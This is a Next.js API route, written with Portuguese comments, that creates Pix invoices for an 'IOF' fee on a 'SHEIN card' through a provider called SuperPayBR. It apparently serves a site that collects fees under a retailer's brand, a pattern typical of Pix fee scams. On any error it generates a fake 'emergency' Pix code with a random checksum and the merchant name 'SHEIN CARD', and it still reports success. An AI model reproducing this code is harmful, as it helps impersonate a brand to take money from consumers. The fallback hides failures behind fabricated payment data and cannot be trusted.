import { type NextRequest, NextResponse } from "next/server"

export async function POST(request: NextRequest) {
  try {
    const body = await request.json()
    const { amount = 1.0 } = body

    console.log("🔄 Criando fatura IOF SuperPayBR...")
    console.log("💰 Valor:", amount)

    // ⚠️ TIMEOUT para evitar requisições travadas
    const controller = new AbortController()
    const timeoutId = setTimeout(() => controller.abort(), 12000) // 12 segundos

    // 1. Autenticar
    const authResponse = await fetch(`${request.nextUrl.origin}/api/superpaybr/auth`, {
      signal: controller.signal,
    })
    const authData = await authResponse.json()

    if (!authData.success) {
      throw new Error(`Erro na autenticação: ${authData.error}`)
    }

    // 2. Criar fatura IOF
    const invoiceUrl = `${process.env.SUPERPAYBR_API_URL}/invoice`
    const invoiceData = {
      amount: Math.round(amount * 100), // Converter para centavos
      description: "IOF - Cartão SHEIN",
      customer: {
        name: "Cliente SHEIN",
        email: "iof@sheincard.com.br",
        phone: "",
        document: "",
      },
      due_date: new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString().split("T")[0], // 24 horas
      payment_methods: ["pix"],
      webhook_url: `${request.nextUrl.origin}/api/superpaybr/webhook`,
    }

    console.log("📤 Enviando dados IOF para SuperPayBR:", {
      amount: invoiceData.amount,
      description: invoiceData.description,
    })

    const invoiceResponse = await fetch(invoiceUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Accept: "application/json",
        Authorization: `Bearer ${authData.token}`,
      },
      body: JSON.stringify(invoiceData),
      signal: controller.signal,
    })

    clearTimeout(timeoutId)

    const invoiceResponseText = await invoiceResponse.text()
    console.log("📥 Resposta SuperPayBR IOF:", invoiceResponseText.substring(0, 300))

    if (!invoiceResponse.ok) {
      throw new Error(`HTTP ${invoiceResponse.status}: ${invoiceResponse.statusText}`)
    }

    let invoiceResult
    try {
      invoiceResult = JSON.parse(invoiceResponseText)
    } catch (parseError) {
      throw new Error(`Erro ao parsear JSON: ${invoiceResponseText}`)
    }

    if (invoiceResult.success && invoiceResult.data) {
      const invoice = invoiceResult.data

      // ⚠️ GERAR QR Code usando QuickChart (sempre funciona)
      const pixPayload = invoice.pix?.payload || invoice.pix_code || ""
      const qrCodeUrl = pixPayload
        ? `https://quickchart.io/qr?text=${encodeURIComponent(pixPayload)}&size=250&format=png&margin=1`
        : `https://quickchart.io/qr?text=PIX_IOF_${Date.now()}&size=250&format=png&margin=1`

      const responseData = {
        id: invoice.id || `IOF_${Date.now()}`,
        invoice_id: invoice.invoice_id || invoice.id,
        external_id: invoice.external_id || invoice.id,
        pix: {
          payload: pixPayload,
          image: qrCodeUrl,
          qr_code: qrCodeUrl,
        },
        status: {
          code: invoice.status?.code || 1,
          title: invoice.status?.title || "Aguardando Pagamento",
          text: invoice.status?.text || "pending",
        },
        valores: {
          bruto: invoice.amount || Math.round(amount * 100),
          liquido: invoice.amount || Math.round(amount * 100),
        },
        vencimento: {
          dia: invoice.due_date || new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString().split("T")[0],
        },
        type: "iof" as const,
      }

      console.log("✅ Fatura IOF SuperPayBR criada com sucesso!")
      console.log("🎯 External ID:", responseData.external_id)

      return NextResponse.json({
        success: true,
        data: responseData,
      })
    } else {
      throw new Error(invoiceResult.message || "Erro ao criar fatura IOF SuperPayBR")
    }
  } catch (error) {
    console.error("❌ Erro ao criar fatura IOF SuperPayBR:", error)

    // ⚠️ CRIAR PIX de emergência para IOF
    const amount = 1.0
    const emergencyPix = `00020126580014br.gov.bcb.pix2536pix.superpaybr.com/qr/v2/IOF${Date.now()}520400005303986540${amount.toFixed(2)}5802BR5909SHEIN CARD5011SAO PAULO62070503***6304${Math.random().toString(36).substr(2, 4).toUpperCase()}`
    const qrCodeUrl = `https://quickchart.io/qr?text=${encodeURIComponent(emergencyPix)}&size=250&format=png&margin=1`

    const emergencyInvoice = {
      id: `IOF_EMG_${Date.now()}`,
      invoice_id: `IOF_EMERGENCY_${Date.now()}`,
      external_id: `IOF_EMG_${Date.now()}`,
      pix: {
        payload: emergencyPix,
        image: qrCodeUrl,
        qr_code: qrCodeUrl,
      },
      status: {
        code: 1,
        title: "Aguardando Pagamento",
        text: "pending",
      },
      valores: {
        bruto: Math.round(amount * 100),
        liquido: Math.round(amount * 100),
      },
      vencimento: {
        dia: new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString().split("T")[0],
      },
      type: "emergency_iof" as const,
    }

    console.log("🚨 Retornando PIX de emergência para IOF SuperPayBR")
    return NextResponse.json({
      success: true,
      data: emergencyInvoice,
    })
  }
}
